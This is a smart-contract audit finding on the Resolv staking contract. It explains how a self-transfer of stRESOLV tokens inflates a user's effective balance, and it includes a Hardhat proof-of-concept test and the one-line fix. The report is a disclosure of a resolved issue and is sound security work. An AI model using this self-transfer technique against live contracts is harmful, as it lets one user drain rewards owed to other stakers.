---
tags:
  - lang/solidity
  - platform/pashov
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/reward-theft
  - sector/staking
protocol: "[[Resolv]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/Resolv-security-review_2025-07-25.md"
genome:
  - "[[reward-calculation]]"
  - "[[reward-theft]]"
  - "[[reward-accounting]]"
---
# [C-01] Rewards can be stolen by transferring tokens to oneself

- id: 61872
- impact: HIGH
- protocol: Resolv_2025-07-25
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/[[Resolv]]-security-review_2025-07-25.md

## Summary


The bug report is about a code issue in a token transfer function called `ResolvStakingV2`. When a user transfers tokens to themselves, their balance is not updated properly, which can lead to them receiving more rewards than they should. This can be exploited by users to steal all the available rewards from the contract. The report includes a proof of concept that demonstrates the issue and provides a recommendation to fix the issue by adding a requirement to prevent users from transferring tokens to themselves. 

## Details


_Resolved_

## Severity

**Impact:** High

**Likelihood:** High

## Description

When `ResolvStakingV2` tokens are transferred, the checkpoints for the sender and the receiver are updated accordingly.

When a user transfers tokens to themselves, the first checkpoint is updated with a negative delta for the user, and the second checkpoint is updated with a positive delta for the same user.

However, after the first checkpoint is updated, the user's balance has not been updated, so when `ResolvStakingCheckpoints.updateEffectiveBalance()` is called for the second checkpoint, the `userStakedBalance` parameter is overestimating the user's balance, which results in the user's `effectiveBalance` being greater than it should be.

```solidity
    function _update(
        address _from,
        address _to,
        uint256 _value
    ) internal override(ERC20VotesUpgradeable, ERC20Upgradeable) {
        if (_from != address(0) && _to != address(0)) {
            checkpoint(_from, false, address(0), - SafeCast.toInt256(_value));
@>          checkpoint(_to, false, address(0), SafeCast.toInt256(_value));

(...)

    function checkpoint(
        address _user,
        bool _claim,
        address _rewardReceiver,
        int256 _delta
    ) internal {
(...)
        totalEffectiveSupply = usersData.updateEffectiveBalance(
            ResolvStakingCheckpoints.UpdateEffectiveBalanceParams({
                user: _user,
@>              userStakedBalance: balanceOf(_user),
```

As a result, users can inflate their effective balance by transferring tokens to themselves, which allows them to claim more rewards than they should, leading to the other users receiving fewer rewards. In practice, this allows someone to steal all the available rewards from the contract.

### Proof of concept

Add the following code to the file `ResolvStakingV2.ts` and run `yarn hardhat test`.

```ts
it.only("Transfer to oneself increases effective balance", async () => {
	const {
		resolvToken,
		resolvStaking,
		REWARD_18,
		staker,
		staker1,
		resolvInitialSupplyHolder
	} = await loadFixture(deployTokenFixture);
	await resolvStaking.setTransferEnabled(true);
	await resolvStaking.setClaimEnabled(true);

	// Two stakers deposit the same amount (100 RESOLV)
	await resolvToken.connect(staker).approve(resolvStaking, ethers.MaxUint256);
	await resolvToken.connect(staker1).approve(resolvStaking, ethers.MaxUint256);
	await resolvToken.connect(resolvInitialSupplyHolder).transfer(staker, parseRESOLV(100));
	await resolvStaking.connect(staker).deposit(parseRESOLV(100), staker);
	await resolvToken.connect(resolvInitialSupplyHolder).transfer(staker1, parseRESOLV(100));
	await resolvStaking.connect(staker1).deposit(parseRESOLV(100), staker1);

	// Distributor deposits 140 reward tokens
	await resolvStaking.addRewardToken(REWARD_18);
	await REWARD_18.approve(resolvStaking.getAddress(), ethers.MaxUint256);
	await resolvStaking.depositReward(REWARD_18, parseREWARD18(140), 0);

	// Staker transfers 100 stRESOLV to himself
	await resolvStaking.connect(staker).transfer(staker, parseRESOLV(100));

	// Staker effective balance is equal to total effective supply
	const stakerEffectiveBalance = (await resolvStaking.usersData(staker.address)).effectiveBalance;
	const totalEffectiveSupply = await resolvStaking.totalEffectiveSupply();
	expect(stakerEffectiveBalance).to.equal(totalEffectiveSupply);
	
	// Rewards are accumulated for 14 days
	await time.increase(DAYS_14);

	// Checkpoints are updated
	await resolvStaking.connect(staker).updateCheckpoint(staker);
	await resolvStaking.connect(staker1).updateCheckpoint(staker1);

	// Staker claimable rewards are approx double the amount of staker1
	const stakerClaimable = await resolvStaking.getUserClaimableAmounts(staker, REWARD_18);
	const staker1Claimable = await resolvStaking.getUserClaimableAmounts(staker1, REWARD_18);
	expect(stakerClaimable).to.closeTo(parseREWARD18(140), 10n ** 14n); // 0.0001e18 tolerance
	expect(staker1Claimable).to.closeTo(parseREWARD18(70), 10n ** 14n); // 0.0001e18 tolerance

	// Both stakers claim rewards
	await resolvStaking.connect(staker).claim(staker, staker);
	await resolvStaking.connect(staker1).claim(staker1, staker1);

	// Staker claims almost all rewards
	// Staker1 claims almost nothing, as there are not enough reward tokens left in the contract
	const stakerBalance = await REWARD_18.balanceOf(staker.address);
	const staker1Balance = await REWARD_18.balanceOf(staker1.address);
	expect(stakerBalance).to.closeTo(parseREWARD18(140), 10n ** 14n); // 0.0001e18 tolerance
	expect(staker1Balance).to.closeTo(parseREWARD18(0), 10n ** 14n); // 0.0001e18 tolerance
})
```

## Recommendations

```diff
    function _update(
        address _from,
        address _to,
        uint256 _value
    ) internal override(ERC20VotesUpgradeable, ERC20Upgradeable) {
        if (_from != address(0) && _to != address(0)) {
+	    require(_from != _to, ResolvStakingErrors.TransferToSelf());
            checkpoint(_from, false, address(0), - SafeCast.toInt256(_value));
```
